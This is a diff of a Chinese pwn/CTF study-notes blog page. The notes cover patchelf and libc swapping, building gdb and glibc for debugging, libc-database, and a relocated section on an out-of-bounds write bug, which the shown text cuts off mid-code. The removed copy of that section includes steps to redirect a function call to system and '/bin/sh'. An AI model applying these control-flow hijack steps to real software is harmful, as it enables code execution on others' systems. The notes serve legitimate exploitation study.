@@ -311,7 +311,7 @@
 
 
                 <time class="article-time--reading">
-                    阅读时长: 122 分钟
+                    阅读时长: 131 分钟
                 </time>
                 <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
   <path stroke="none" d="M0 0h24v24H0z"/>
@@ -322,7 +322,7 @@
 
 
                 <time class="article-words">
-                    60785 字
+                    65202 字
                 </time>
             </div>
         
@@ -609,27 +609,25 @@
 </div><p>改变程序的链接库路径，使用工具修改libc文件</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl">sudo ln ld-x.xx.so /lib64/ld-x.xx.so
-</span></span><span class="line"><span class="cl"><span class="c1">#生成符号连接以使gdb能够调试，若未设置跳转到pwndbg调试解决问题</span>
+<pre tabindex="0" class="chroma"><code class="language-Bash" data-lang="Bash"><span class="line"><span class="cl"><span class="c1">#生成符号连接以使gdb能够调试，若未设置跳转到pwndbg调试解决问题</span>
+</span></span><span class="line"><span class="cl">sudo ln ld-x.xx.so /lib64/ld-x.xx.so
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># libc 和 ld 都需要有可执行权限</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># libc 和 ld 都需要有可执行权限 chmod 777 xxx, new_libc.so使用相对路径加./ 执行失败可能架构未匹配</span>
 </span></span><span class="line"><span class="cl">patchelf --set-interpreter ld-x.xx.so elf <span class="c1"># 来修改文件ld.so</span>
-</span></span><span class="line"><span class="cl">patchelf --replace-needed old_libc.so new_libc.so elf  <span class="c1"># 来修改文件libc.so</span>
-</span></span><span class="line"><span class="cl"><span class="c1">#尽量使用相对路径</span>
+</span></span><span class="line"><span class="cl">patchelf --replace-needed libc.so.6 ./new_libc.so elf  <span class="c1"># 来修改文件libc.so</span>
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># 可成功执行</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 利用 glibc-all-in-one 成功执行</span>
 </span></span><span class="line"><span class="cl">patchelf --set-interpreter ./glibc-all-in-one/libs/ubuntu/ld.so --set-rpath ./glibc-all-in-one/libs/ubuntu elf
 </span></span></code></pre></td></tr></table>
 </div>
@@ -642,8 +640,31 @@
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="s1">&#39;~/name/x.xx-3ubuntu1_amd64/ld-x.xx.so&#39;</span><span class="p">,</span> <span class="s1">&#39;./elf&#39;</span><span class="p">],</span> <span class="n">env</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;LD_PRELOAD&#34;</span><span class="p">:</span><span class="s1">&#39;~/name/x.xx-3ubuntu1_amd64/libc.so.6&#39;</span><span class="p">})</span>
 </span></span></code></pre></td></tr></table>
 </div>
+</div><p>更改为</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ldd ./elf
+</span></span><span class="line"><span class="cl">	linux-vdso.so.1 <span class="o">(</span>0x00007fff2be66000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	./libc-2.23.so <span class="o">(</span>0x00007f81a8b3b000<span class="o">)</span>
+</span></span><span class="line"><span class="cl">	./ld-2.23.so <span class="o">=</span>&gt; /lib64/ld-linux-x86-64.so.2 <span class="o">(</span>0x00007f81a8ee5000<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
 </div><p><strong>注意：在单个libc版本中还有多个版本，需要多次在本地尝试</strong></p>
-<p>需要在gdb中设置</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">show debug-file-directory <span class="c1"># usr/lib/debug, 其中包含.build-id</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>需要在gdb中设置</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -1210,15 +1231,7 @@
 </span></span><span class="line"><span class="cl">    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">))</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h3 id="pwndbg">pwndbg</h3>
-<ul>
-<li>
-<p>切换gdb插件gef、peda、pwndbg：<code>vim ~/.gdbinit</code></p>
-</li>
-<li>
-<p>gdb中的栈地址很大概率不可靠，且默认关闭了ASLR</p>
-</li>
-</ul>
+</div><h3 id="gdb">gdb</h3>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -1233,93 +1246,134 @@
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
-</span><span class="lnt">27
-</span><span class="lnt">28
-</span><span class="lnt">29
-</span><span class="lnt">30
-</span><span class="lnt">31
-</span><span class="lnt">32
-</span><span class="lnt">33
-</span><span class="lnt">34
-</span><span class="lnt">35
-</span><span class="lnt">36
-</span><span class="lnt">37
-</span><span class="lnt">38
-</span><span class="lnt">39
-</span><span class="lnt">40
-</span><span class="lnt">41
-</span><span class="lnt">42
-</span><span class="lnt">43
-</span><span class="lnt">44
-</span><span class="lnt">45
-</span><span class="lnt">46
-</span><span class="lnt">47
-</span><span class="lnt">48
-</span><span class="lnt">49
-</span><span class="lnt">50
-</span><span class="lnt">51
-</span><span class="lnt">52
-</span><span class="lnt">53
-</span><span class="lnt">54
-</span><span class="lnt">55
-</span><span class="lnt">56
-</span><span class="lnt">57
-</span><span class="lnt">58
-</span><span class="lnt">59
-</span><span class="lnt">60
-</span><span class="lnt">61
-</span><span class="lnt">62
-</span><span class="lnt">63
-</span><span class="lnt">64
-</span><span class="lnt">65
-</span><span class="lnt">66
-</span><span class="lnt">67
-</span><span class="lnt">68
-</span><span class="lnt">69
-</span><span class="lnt">70
-</span><span class="lnt">71
-</span><span class="lnt">72
-</span><span class="lnt">73
-</span><span class="lnt">74
-</span><span class="lnt">75
-</span><span class="lnt">76
-</span><span class="lnt">77
-</span><span class="lnt">78
-</span><span class="lnt">79
-</span><span class="lnt">80
-</span><span class="lnt">81
-</span><span class="lnt">82
-</span><span class="lnt">83
-</span><span class="lnt">84
-</span><span class="lnt">85
-</span><span class="lnt">86
-</span><span class="lnt">87
-</span><span class="lnt">88
-</span><span class="lnt">89
-</span><span class="lnt">90
-</span><span class="lnt">91
-</span><span class="lnt">92
-</span><span class="lnt">93
-</span><span class="lnt">94
-</span><span class="lnt">95
-</span><span class="lnt">96
-</span><span class="lnt">97
-</span><span class="lnt">98
-</span><span class="lnt">99
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 更新 https://ftp.gnu.org/gnu/gdb/下载源码，升级gdb</span>
+</span></span><span class="line"><span class="cl">tar -zxvf gdb-xx.x.tar.gz
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> gdb-xx.x
+</span></span><span class="line"><span class="cl">mkdir build 
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> build
+</span></span><span class="line"><span class="cl">../configure --with-python<span class="o">=</span>/usr/bin/python3.8 --enable-targets<span class="o">=</span>all
+</span></span><span class="line"><span class="cl">make <span class="o">&amp;&amp;</span> make install <span class="c1"># apt install texinfo; sudo unlink /usr/local/share/man/man1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 替换老版本</span>
+</span></span><span class="line"><span class="cl">mv /usr/local/bin/gdb /usr/local/bin/gdb_bak
+</span></span><span class="line"><span class="cl">cp ~/gdb-xx.x/gdb/gdb /usr/local/bin/
+</span></span><span class="line"><span class="cl">gdb -v
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="pwndbg">pwndbg</h3>
+<ul>
+<li>
+<p>切换gdb插件gef、peda、pwndbg：<code>vim ~/.gdbinit</code></p>
+</li>
+<li>
+<p>gdb中的栈地址很大概率不可靠，且默认关闭了ASLR</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-Python" data-lang="Python"><span class="line"><span class="cl"><span class="c1">#下断点</span>
@@ -1421,6 +1475,8 @@
 </span></span><span class="line"><span class="cl"><span class="n">pwndbg</span> <span class="c1"># 查看命令</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="n">retaddr</span> <span class="c1"># 查看返回地址</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">info</span> <span class="n">sharedlibrary</span> <span class="c1"># 显示libc.so.6的调试符号</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p><strong>查看内存：</strong></p>
@@ -1512,7 +1568,7 @@
 </span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
-<li>gdb中设置<code>debug file</code>就能正常使用gdb功能</li>
+<li>程序运行前gdb中设置<code>debug file</code>就能正常使用gdb调试符号功能</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -1870,7 +1926,82 @@
 </span></span><span class="line"><span class="cl">    <span class="c1"># @表示不回显命令，-表示忽略错误，不中断makefile执行，*是通配符，表示匹配目录下的所有文件</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><h2 id="基础知识">基础知识</h2>
+</div><h3 id="libc-database">libc-database</h3>
+<p>构建本地 libc 偏移量数据库，可替代glibc-all-in-one</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 下载libc符号表与偏移文件</span>
+</span></span><span class="line"><span class="cl">./get
+</span></span><span class="line"><span class="cl">./get ubuntu debian
+</span></span><span class="line"><span class="cl">./get all
+</span></span><span class="line"><span class="cl"><span class="c1"># 下载的libc存放在db中，依赖db通过符号和偏移查找libc版本</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># find根据符号和偏移找到libc版本呢</span>
+</span></span><span class="line"><span class="cl">./find system 0xaaa
+</span></span><span class="line"><span class="cl">./dump libcx_x.xx-xubuntux_xxx <span class="c1"># 查找()中libc常用符号和偏移，后面加上system指定查找某符号偏移</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># add 手动添加libc库到db</span>
+</span></span><span class="line"><span class="cl">./add libcxxx.so
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># identify判断某个libc是否已存在于db，支持hash查找</span>
+</span></span><span class="line"><span class="cl">md5sum ./libc-xx.so
+</span></span><span class="line"><span class="cl">./identify <span class="nv">md5</span><span class="o">=</span>xxxxxxxxxxxxxxxxxxxxxx
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># download 下载与libc ID对应的整个libc到libs目录</span>
+</span></span><span class="line"><span class="cl">./download libcx_x.xx-xubuntux_xx
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>libc-database</strong>中libc和ld带符号信息，但没有glibc-all-in-one中配置的debug，即在gdb调试时无法显示符号信息，需要手动下载：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dpkg-deb -x libcx-dbg_x.xx-xubuntux.x_amd64.deb ./sym
+</span></span><span class="line"><span class="cl">cp ~/sym/usr/lib/debug/lib/x86_64-linux-gnu/ xxxx/.debug/ <span class="c1"># 其中file libc和ld会带有with debug_info, not stripped信息</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 最终在gdb中set debug-file-directory xxxx/.debug/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="debuginfod">debuginfod</h3>
+<ul>
+<li>用于管理libc的调试符号信息，ubuntu22.04以上该功能gdb默认启用</li>
+</ul>
+<p>【旧版本】</p>
+<ul>
+<li>
+<p>gdb10.1版本支持debuginfod，且elfutils-0.179后才支持，编译gdb configure加入<code>--with-debuginfod</code></p>
+</li>
+<li>
+<p><code>vim /etc/debuginfod/ubuntu.urls</code>写入<code>https://debuginfod.ubuntu.com</code></p>
+</li>
+<li>
+<p>pwndbg中在<code>~/.gdbinit</code>写入<code>set debuginfod enabled on</code></p>
+</li>
+</ul>
+<h2 id="基础知识">基础知识</h2>
 <h3 id="计组">计组</h3>
 <p><strong>CPU架构</strong></p>
 <ul>
@@ -1923,6 +2054,70 @@
 </span></span><span class="line"><span class="cl">./libc.so.6 <span class="c1"># 执行libc文件查看版本</span>
 </span></span><span class="line"><span class="cl">strings libc.so.6 <span class="p">|</span> grep ubuntu <span class="c1"># 查看给定libc对应ubuntu版本</span>
 </span></span><span class="line"><span class="cl">strings libc.so.6 <span class="p">|</span> grep version <span class="c1"># 查看libc版本</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>编译glibc</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz <span class="c1"># 下载压缩包，其中包括glibc源码，可用于后续gdb dir</span>
+</span></span><span class="line"><span class="cl">tar -zxvf glibc-2.31.tar.gz <span class="c1"># 解压</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> glibc-2.31
+</span></span><span class="line"><span class="cl">mkdir build <span class="o">&amp;&amp;</span> <span class="nb">cd</span> build
+</span></span><span class="line"><span class="cl"><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&#34;</span> <span class="se">\ </span><span class="c1"># C编译器标志</span>
+</span></span><span class="line"><span class="cl"><span class="nv">CXXFLAGS</span><span class="o">=</span><span class="s2">&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error&#34;</span> <span class="c1"># C++编译器标志</span>
+</span></span><span class="line"><span class="cl">sudo ../configure<span class="o">=</span>/home/xx/glibc-2.31/amd64 --disable-werror --enable-debug<span class="o">=</span>yes
+</span></span><span class="line"><span class="cl">sudo make
+</span></span><span class="line"><span class="cl">sudo make install
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>最终<code>/home/xx/glibc-2.31/amd64</code>目录下有<code>bin  etc  include  lib  libexec  sbin  share  var</code>，<code>lib</code>中包含所需的<code>libc-2.31.so</code>和<code>ld-2.31.so</code>文件，patchelf后可调试libc中函数c代码</li>
+<li>对应出题提供的libc和ld，找到编译后lib下的libc和ld进行patchelf，并且<code>gdb dir 源代码目录(source/malloc)</code>来调试libc函数信息</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># gcc -Wl,-rpath指定链接的libc库，-Wl,-dynamic-linker指定动态链接器</span>
+</span></span><span class="line"><span class="cl">gcc -g test.c -Wl,-rpath<span class="o">=</span>/home/x/glibc/amd64/lib -Wl,-dynamic-linker<span class="o">=</span>/home/x/glibc/amd64/lib/ld-linux.so.2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>32位</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">wget http://ftp.gnu.org/gnu/glibc/glibc-2.31.tar.gz <span class="c1"># 下载压缩包</span>
+</span></span><span class="line"><span class="cl">tar -zxvf glibc-2.31.tar.gz <span class="c1"># 解压</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> glibc-2.31
+</span></span><span class="line"><span class="cl">mkdir build <span class="o">&amp;&amp;</span> <span class="nb">cd</span> build
+</span></span><span class="line"><span class="cl"><span class="nv">CFLAGS</span><span class="o">=</span><span class="s2">&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32&#34;</span>  <span class="c1"># C编译器标志</span>
+</span></span><span class="line"><span class="cl"><span class="nv">CXXFLAGS</span><span class="o">=</span><span class="s2">&#34;-g -g3 -ggdb -gdwarf-4 -Og -Wno-error -m32&#34;</span>  <span class="c1"># C++编译器标志</span>
+</span></span><span class="line"><span class="cl">sudo ../configure --prefix<span class="o">=</span>/home/xx/glibc-2.31/i686 --host<span class="o">=</span>i686-pc-linux-gnu --disable-werror --enable-debug<span class="o">=</span>yes
+</span></span><span class="line"><span class="cl">sudo make
+</span></span><span class="line"><span class="cl">sudo make install
 </span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="mips">Mips</h3>
@@ -3666,51 +3861,7 @@
 </table></div>
 <p>【<strong>调试方法</strong>】</p>
 <p>根据相应汇编看寄存器的变化值，然后逆向使用python进行相反运算获取对应十六进制值再转换为十进制，最终可以根据调试构造出所需要的size大小，进而若有可控制的数组偏移如下，即可利用更改内存值</p>
-<h2 id="oob漏洞">OOB漏洞</h2>
-<p>Out-of-Bounds，包括数组越界、指针偏移、使用后释放UAF等</p>
-<p><strong>写后判断</strong></p>
-<p>通过该漏洞可以造成越界写内容，若arg_list在bss段可以借此<strong>越界改其他bss段上的变量</strong></p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">){</span>
-</span></span><span class="line"><span class="cl">    <span class="n">next_args</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span> <span class="c1">// 获取命令行输入参数遍历
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">next_args</span> <span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">next_args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">31</span> <span class="p">){</span><span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
-</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">nargs</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">    <span class="n">strcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">arg_list</span><span class="p">[</span><span class="mi">32</span> <span class="o">*</span> <span class="n">i</span><span class="p">],</span> <span class="n">next_args</span><span class="p">);</span> <span class="c1">// 漏洞点: 先写入arg_list再判断是否大于10
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="n">nargs</span> <span class="o">&lt;=</span> <span class="mi">10</span> <span class="p">){</span> <span class="k">return</span> <span class="n">idx</span><span class="p">;}</span>
-</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span><span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><p><strong>调用越界</strong></p>
-<ul>
-<li>先任意写入system地址到bss段，尝试越界修改bss段中idx使得偏移调用system函数</li>
-<li><code>arg_list</code>也可尝试任意地址写入<code>'/bin/sh'</code></li>
-<li>注意有时<code>p64(0xab)</code>时使用<code>replace(b'\x00', b'')</code>或<code>p64(0x123456781234)[:6]</code>替换防止提前0截断</li>
-</ul>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="p">((</span><span class="kt">void</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">))</span><span class="o">*</span><span class="p">(</span><span class="o">&amp;</span><span class="n">funcs_list</span> <span class="o">+</span> <span class="mi">3</span> <span class="o">*</span> <span class="n">idx</span><span class="p">))(</span><span class="n">arg_list</span><span class="p">);</span>
-</span></span></code></pre></td></tr></table>
-</div>
-</div><h2 id="栈溢出漏洞">栈溢出漏洞</h2>
+<h2 id="栈溢出漏洞">栈溢出漏洞</h2>
 <h3 id="栈基础">栈基础</h3>
 <p>函数调用栈在内存中<strong>从高地址向低地址生长</strong>，所以栈顶对应内存地址压栈时变小，退栈时变大</p>
 <p><img src="/img/pwn_note.zh-cn.assets/-17284464998305.assets"
@@ -3805,7 +3956,51 @@
 </ul>
 </li>
 </ul>
-<h3 id="地址泄露">地址泄露</h3>
+<h3 id="oob">OOB</h3>
+<p>Out-of-Bounds，包括数组越界、指针偏移、使用后释放UAF等</p>
+<p><strong>写后判断</strong></p>
+<p>通过该漏洞可以造成越界写内容，若arg_list在bss段可以借此<strong>越界改其他bss段上的变量</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="n">next_args</span> <span class="o">=</span> <span class="n">strtok</span><span class="p">(</span><span class="mi">0LL</span><span class="p">,</span> <span class="s">&#34; &#34;</span><span class="p">);</span> <span class="c1">// 获取命令行输入参数遍历
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">next_args</span> <span class="p">)</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="n">strlen</span><span class="p">(</span><span class="n">next_args</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">31</span> <span class="p">){</span><span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">=</span> <span class="n">nargs</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
